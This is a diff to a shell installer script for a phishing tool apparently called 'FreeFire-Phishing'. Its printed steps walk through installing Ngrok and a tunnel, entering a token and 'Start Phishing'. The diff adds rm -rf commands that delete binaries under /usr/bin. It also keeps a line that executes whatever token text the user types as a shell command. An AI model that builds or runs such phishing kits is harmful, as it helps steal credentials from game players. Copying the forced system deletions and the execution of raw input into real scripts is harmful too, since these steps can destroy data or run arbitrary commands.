@@ -24,6 +24,13 @@ echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
+echo ""
+echo ""
+rm -rf /usr/bin/SUMAN
+rm -rf /usr/bin/OnlineHacking
+rm -rf /usr/bin/FreeFire-Phishing
+rm -rf /usr/bin/ngrok
+rm -rf /usr/bin/cloudflared
 sleep 5
 clear
 echo ""
@@ -147,7 +154,6 @@ echo ""
 read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
 echo ""
-sleep1
 echo
 cp -R cloudflared ngrok SUMAN/1/
 cp -R cloudflared ngrok SUMAN/2/
